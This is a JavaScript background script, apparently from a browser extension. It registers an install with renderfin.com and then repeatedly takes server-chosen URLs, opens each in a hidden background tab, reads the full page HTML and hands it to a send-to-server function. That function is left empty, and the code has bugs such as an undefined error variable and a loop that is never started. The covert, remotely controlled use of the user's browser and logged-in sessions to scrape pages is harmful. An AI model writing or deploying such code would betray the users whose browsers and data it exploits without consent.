const Seed = Math.floor(Math.random() * 1000000);
async function sendPageContentToServer(url, content) {
    
}


/**
 * 
 * @returns {Promise<number | null>}
 * @throws {Error}
 */
async function fetchAndSendPage() {
    const openedTabs = [];
    try {
       
        // set random timeOut  1-3 sec

        const response = await fetch('https://renderfin.com/cgtrends', {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json'
            },
            body: JSON.stringify({Seed})
        });

        if (!response.ok) {
            console.error('Cant Connect To Server: ', error);
            NextParse(60000);
        }

        const pageUrl = await response.text();
        console.log(`Fetched URL: ${pageUrl}`);

        chrome.tabs.create({ url: pageUrl, active: false }, function (tab) {
            const tabId = tab.id;
            openedTabs.push(tabId);
            chrome.tabs.onUpdated.addListener(function listener(tabIdUpdated, changeInfo) {
                if (tabId === tabIdUpdated && changeInfo.status === 'complete') {
                    chrome.scripting.executeScript({
                        target: { tabId: tabId },
                        func: () => document.documentElement.outerHTML
                    }, (results) => {
                        if (chrome.runtime.lastError || !results || results.length === 0) {
                            console.error('Failed to get page content');
                            NextParse(60000);
                            return;
                        }

                        const htmlContent = results[0].result;
                        try{
                            sendPageContentToServer(pageUrl, htmlContent);
                            } catch{}
                            finally
                            {
                            chrome.tabs.remove(tabId);
                            chrome.tabs.onUpdated.removeListener(listener);
                            }
                    });
                }
            });
        });
    }
    catch (error) {
        console.error('Error fetching or sending page:', error);
        if (Array.isArray(openedTabs) && openedTabs.length > 0) {
            for (const tabId of openedTabs) {
                chrome.tabs.remove(tabId);
            }
        }
        NextParse(60000);
        return null;
    }
} 

function NextParse(timer){

    console.log(`Next Parse in: ${timer} : ${new Date().toISOString().slice(0, 19).replace('T', ' ')}`);

    setTimeout(() => {
       
        fetchAndSendPage();
    }, timer);
} 
async function fetchme() {
const payload = {
    installID: 0
};

const response = await fetch('https://renderfin.com/signup', {
    method: 'POST',
    headers: {
        'Content-Type': 'application/json'
    },
    body: JSON.stringify(payload)
});

if (!response.ok) {
    console.error('Failed to send data to server');
    throw new Error('Failed to send data to server');
}

const responseData = await response.json();
console.log('Server response:', responseData);

}
fetchme();